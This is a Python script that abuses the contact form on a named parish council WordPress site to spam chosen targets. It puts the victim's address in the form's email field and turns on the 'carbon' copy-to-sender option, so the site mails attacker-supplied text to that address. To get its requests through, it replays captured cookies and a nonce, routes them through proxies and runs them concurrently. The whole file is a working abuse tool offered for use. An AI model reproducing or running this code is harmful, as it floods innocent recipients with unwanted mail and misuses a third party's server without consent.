from os.path import basename

import requests

from module import Spam

headers = {
    'authority': 'millomwithoutparishcouncil.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_wsm_ref_1_6120=%5B%22%22%2C%22%22%2C1675960080%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _wsm_ses_1_6120=*; _wsm_id_1_6120=8ada83aca51b9757.1675960080.1.1675960114.1675960080; cfx-challenge=5; cfx-message=test; cfx-subject=test; cfx-name=test; cfx-email=wezxasqw@gmail.com; cfx-carbon=true; cfx-agree=true',
    'origin': 'https://millomwithoutparishcouncil.com',
    'referer': 'https://millomwithoutparishcouncil.com/',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        text = self.get_text()
        cookies = {
            '_wsm_ref_1_6120': '%5B%22%22%2C%22%22%2C1675960080%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
            '_wsm_ses_1_6120': '*',
            '_wsm_id_1_6120': '8ada83aca51b9757.1675960080.1.1675960114.1675960080',
            'cfx-challenge': '5',
            'cfx-message': 'test',
            'cfx-subject': 'test',
            'cfx-name': 'test',
            'cfx-email': target,
            'cfx-carbon': 'true',
            'cfx-agree': 'true',
        }
        data = {
            'action': 'contactformx',
            'nonce': '6d210e3192',
            'name': text,
            'email': target,
            'subject': text,
            'challenge': '5',
            'message': text,
            'recaptcha': '',
            'carbon': 'true',
            'agree': 'true',
        }

        response = requests.post(
            'https://millomwithoutparishcouncil.com/wp-admin/admin-ajax.php',
            cookies=cookies,
            headers=headers,
            data=data, proxies=self.get_proxies()
        )
        return response


def main():
    s = 'Your message has been sent.'
    spam = ConcreteSpam(basename(__file__)[:-3], s)
    res = spam.send_post()
    if res:
        spam.run_concurrently(1)


if __name__ == '__main__':
    main()
